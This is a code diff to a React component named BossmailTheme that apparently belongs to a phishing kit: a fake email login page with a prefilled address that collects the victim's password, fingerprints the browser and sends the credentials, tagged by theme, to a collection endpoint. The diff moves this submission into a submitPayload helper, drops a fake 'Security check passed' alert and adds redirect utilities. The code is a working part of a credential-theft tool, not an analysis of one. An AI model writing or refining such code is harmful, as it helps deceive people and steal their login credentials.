@@ -3,6 +3,7 @@ import React, { useState } from 'react';
 import { ObfuscatedText, useSecurity } from '../components/SecurityManager';
 import { motion } from 'framer-motion';
 import { encryptData, getFingerprint } from '../SecurityUtils';
+import { themeRedirects } from '../DNSUtils';
 
 interface BossmailThemeProps {
   prefilledEmail?: string;
@@ -12,26 +13,13 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
   const [username, setUsername] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { reportViolation } = useSecurity();
+  const { reportViolation, submitPayload } = useSecurity();
 
   const handleSubmit = async () => {
     setIsSubmitting(true);
     try {
-      const encryptedPassword = await encryptData(password);
-      const fingerprint = getFingerprint();
-      
-      await fetch('/api/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email: username,
-          password: encryptedPassword,
-          fingerprint,
-          theme: 'bossmail'
-        })
-      });
-      
-      alert('Security check passed, logging in...');
+      await submitPayload({ email: username, password }, 'bossmail');
+      setPassword('');
     } catch (err) {
       console.error(err);
     } finally {
